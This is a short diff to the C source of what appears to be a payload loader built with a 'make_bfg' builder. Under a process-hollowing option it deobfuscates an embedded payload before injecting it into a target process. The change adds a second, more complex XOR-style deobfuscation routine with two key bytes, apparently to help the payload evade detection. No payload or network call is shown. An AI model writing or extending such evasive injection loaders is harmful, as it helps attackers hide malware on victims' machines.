@@ -145,9 +145,16 @@ int main (int argc, char **argv)
 	#ifdef PROCESS_HOLLOWING
 		#ifdef XOR_OBFUSCATION
 			// Deobfuscate payload
-			// (payloadSize, keyByte and payload specified in defs.h by make_bfg)
-			// deobfuscate defined in hollow.h
-			deobfuscate(payload, payloadSize, keyByte);			
+			// (payloadSize, keyByte0 and payload specified in defs.h by make_bfg)
+			// deobfuscate() defined in hollow.h
+			deobfuscate(payload, payloadSize, keyByte0);			
+		#endif
+	
+		#ifdef ALT_OBFUSCATION
+			// Alternative, more complex deobfuscation of payload
+			// (payloadSize, keyByte0, keyByte1 and payload specified in defs.h by make_bfg)
+			// altDeobfuscate() defined in hollow.h
+			altDeobfuscate(payload, payloadSize, keyByte0, keyByte1);
 		#endif
 	
 		// Instanciate target process
